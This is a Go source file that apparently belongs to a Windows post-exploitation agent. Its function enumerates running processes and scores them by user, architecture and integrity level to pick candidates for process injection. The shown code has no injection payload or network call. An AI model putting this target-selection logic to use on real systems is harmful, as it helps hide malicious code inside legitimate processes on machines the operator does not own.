//go:build windows

package commands

import (
	"fmt"
	"runtime"
	"sort"

	"golang.org/x/sys/windows"
)

// SelectInjectionTarget scores running processes and returns the best candidate(s)
// for injection based on the specified mode.
func SelectInjectionTarget(mode TargetMode) ([]InjectionTarget, error) {
	// Get process list with per-process attributes (need user, arch, integrity)
	procs, err := getProcessList(PsArgs{Verbose: true})
	if err != nil {
		return nil, fmt.Errorf("process enumeration: %w", err)
	}

	if len(procs) == 0 {
		return nil, fmt.Errorf("no processes found")
	}

	// Get our own process info for comparison
	myPID := int32(windows.GetCurrentProcessId())
	myArch := runtime.GOARCH
	if myArch == "amd64" {
		myArch = "x64"
	}

	var myUser string
	var myIntegrity int
	for _, p := range procs {
		if p.PID == myPID {
			myUser = p.User
			myIntegrity = p.IntegrityLevel
			break
		}
	}

	var targets []InjectionTarget
	for _, p := range procs {
		target := scoreProcess(p, myPID, myArch, myUser, myIntegrity, mode)
		if target != nil {
			targets = append(targets, *target)
		}
	}

	// Sort by score descending
	sort.Slice(targets, func(i, j int) bool {
		return targets[i].Score > targets[j].Score
	})

	// Return top 10 candidates
	if len(targets) > 10 {
		targets = targets[:10]
	}

	return targets, nil
}
